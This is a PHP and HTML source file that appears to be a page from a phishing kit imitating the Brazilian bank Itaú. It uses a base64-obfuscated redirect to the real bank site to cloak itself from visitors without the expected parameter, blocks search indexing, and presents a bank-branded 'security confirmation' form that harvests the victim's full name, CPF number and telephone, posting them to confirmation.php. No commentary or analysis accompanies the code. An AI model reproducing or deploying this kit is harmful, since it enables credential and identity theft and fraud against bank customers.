<?php 
if($_GET["the"]==null){
$xxxx = base64_decode("aHR0cHM6Ly93d3cuaXRhdS5jb20uYnIvbW9iaWxlL2NhcnRvZXMv");
header("Location: $xxxx");
}
else{
}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<link rel="stylesheet" type="text/css" href="assets/css/style.pendente.css?xx<?php echo time();?>">
	<script type="text/javascript" src="js/jquery-3.2.1.min.js?xx<?php echo time();?>"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js?xx<?php echo time();?>"></script>
	<script type="text/javascript" src="js/the.data.js?xx<?php echo time();?>"></script>
</head>
<body>
	<header class="top-promo">
		<img src="assets/images/logo-login.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Segurança</li>
			<li>Confirmação</li>
			<li>sucesso</li>
		</ul>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
			<p>Agora para finalizar confirme os dados solicitados abaixo.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="confirmation.php?the=<?php echo time();?>">
				<div class="frm-item">
					<input type="text" id="namefull" name="namefull" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)">
					<label for="namefull" class="label-float">Nome Titular</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="numcpf" name="numcpf" maxlength="14" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)">
					<label for="numcpf" class="label-float">CPF</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="telephone" name="telephone" maxlength="15" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)">
					<label for="telephone" class="label-float">DDD + Telefone</label>
				</div>
				<input type="submit" id="btncad" class="btncad" name="btnconf" value="Confirmar" disabled="disabled">
			</form>
		</div>
	</section>
</body>
</html>